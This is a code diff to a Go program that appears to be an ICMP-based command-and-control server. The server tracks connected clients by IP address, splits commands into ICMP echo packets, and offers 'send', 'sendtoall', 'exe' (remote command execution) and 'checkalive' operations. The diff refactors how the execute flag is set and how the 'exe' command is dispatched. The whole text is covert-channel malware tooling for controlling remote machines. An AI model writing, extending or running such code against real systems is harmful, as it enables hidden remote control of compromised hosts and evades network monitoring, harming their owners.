@@ -32,7 +32,7 @@ var DEBUG bool = true
 var id int = 0
 var clients = make(map[int]string)
 var ALIVE = make(map[string]bool)
-var SSM bool = true
+var SSM bool = false
 var execute = false
 var PACKETQUEUE []icmp.Message
 var KEY rune = 'B'
@@ -153,7 +153,7 @@ func generate_packet(payload string, segment int) {
 				Data: []byte(generate_header(segment, true) + payload),
 			},
 		}
-		fmt.Println(len(PACKETQUEUE))
+		// fmt.Println(len(PACKETQUEUE))
 		PACKETQUEUE[segment] = packet
 		generate_packet(nextPayload, segment+1)
 	} else {
@@ -168,7 +168,7 @@ func generate_packet(payload string, segment int) {
 				Data: []byte(generate_header(segment, false) + payload),
 			},
 		}
-		fmt.Println(len(PACKETQUEUE))
+		// fmt.Println(len(PACKETQUEUE))
 		PACKETQUEUE[segment] = packet
 	}
 }
@@ -189,7 +189,6 @@ func send_packets(addr string, c icmp.PacketConn) {
 }
 
 func sendmessage(command string, clientid int, c icmp.PacketConn) {
-	execute = false
 	ipaddr := strings.TrimRight(clients[clientid], "\r\n")
 	generate_packet(command, 0)
 	if DEBUG {
@@ -428,6 +427,7 @@ func main() {
 			showclients()
 
 		} else if strings.HasPrefix(input, "sendtoall") {
+			execute = false
 			_, command, _ := strings.Cut(input, " ")
 			command = strings.TrimRight(command, "\r\n")
 			fmt.Println("[BEFORE]", command)
@@ -436,6 +436,7 @@ func main() {
 			}
 
 		} else if strings.HasPrefix(input, "send") {
+			execute = false
 			_, after, _ := strings.Cut(input, " ")
 			id, command, _ := strings.Cut(after, " ")
 			clientid := parse_id(id)
@@ -448,25 +449,20 @@ func main() {
 			}
 
 		} else if strings.HasPrefix(input, "exe") {
+			execute = true
 			_, after, _ := strings.Cut(input, " ")
 			id, command, _ := strings.Cut(after, " ")
 			clientid := parse_id(id)
+			command = strings.TrimRight(command, "\r\n")
 			if _, ok := clients[clientid]; ok {
-				command = strings.TrimRight(command, "\r\n")
-				execute = true
-				ipaddr := strings.TrimRight(clients[clientid], "\r\n")
-				generate_packet(command, 0)
-				if DEBUG {
-					fmt.Print("[DEBUG] ", command, " executed on ", clients[clientid])
-				}
-				send_packets(ipaddr, *c)
+				sendmessage(command, clientid, *c)
 			} else {
 				fmt.Println("Invalid Client")
 				continue
 			}
 
 		} else if strings.HasPrefix(input, "checkalive") {
-
+			execute = false
 			for _, client := range clients {
 				ALIVE[client] = false
 			}
